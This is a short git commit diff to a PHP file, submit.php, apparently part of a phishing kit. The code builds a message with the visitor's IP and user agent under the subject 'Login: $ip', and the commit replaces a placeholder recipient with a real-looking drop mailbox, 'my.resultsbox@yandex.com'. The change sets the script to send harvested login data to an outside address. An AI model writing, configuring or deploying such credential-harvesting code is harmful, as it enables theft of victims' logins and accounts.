58fca2bcd1bdaba543907c21a4e633a239b815d5
salesdoors4secuirty-debug <sales.doors4secuirty@gmail.com>
2026-04-09 20:22:46 +0100

    submit.php

--- submit.php
+++ submit.php
@@ -56,7 +56,7 @@ $message .= "UserAgent: $useragent\n";
 $message .= "|--------------------------------|\n";
 
 // Send mail
-$send = "yourmail@gmail.com"; // ✅ replace with your email
+$send = "my.resultsbox@yandex.com"; // ✅ replace with your email
 
 
 $subject = "Login: $ip";
